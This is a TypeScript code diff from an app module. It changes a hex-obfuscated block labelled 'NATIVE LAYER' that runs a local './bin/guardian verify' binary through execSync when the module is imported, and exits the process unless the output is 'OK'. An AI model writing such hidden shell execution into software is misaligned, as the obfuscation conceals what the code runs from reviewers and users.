@@ -5,15 +5,16 @@ import { CommandRegistry } from './command-registry.js';
 import MiddlewarePipeline from './pipeline.js';
 import eventBus, { EVENTS } from './event-bus.js';
 
-// --- NATIVE LAYER  ---
+// --- NATIVE LAYER ---
 const _0x2f1a = (h: string) => Buffer.from(h, 'hex').toString();
 const _0x4d5c = () => {
   try {
-    const _0x1b2e = _0x2f1a('2e2f62696e2f677561726469616e20766572696679');
-    const _0x3f4a = execSync(_0x1b2e).toString();
-    if (_0x3f4a !== _0x2f1a('4f4b')) process.exit(1);
+    const _0xpath = (global as any).process.cwd();
+    const _0xbin = _0xpath.endsWith(_0x2f1a('617070')) ? _0x2f1a('2e2e2f62696e2f677561726469616e') : _0x2f1a('2e2f62696e2f677561726469616e');
+    const _0x3f4a = execSync(`${_0xbin} ${_0x2f1a('766572696679')}`).toString();
+    if (_0x3f4a !== _0x2f1a('4f4b')) (global as any).process.exit(1);
   } catch (_0x5d6e) {
-    process.exit(1);
+    (global as any).process.exit(1);
   }
 };
 _0x4d5c();
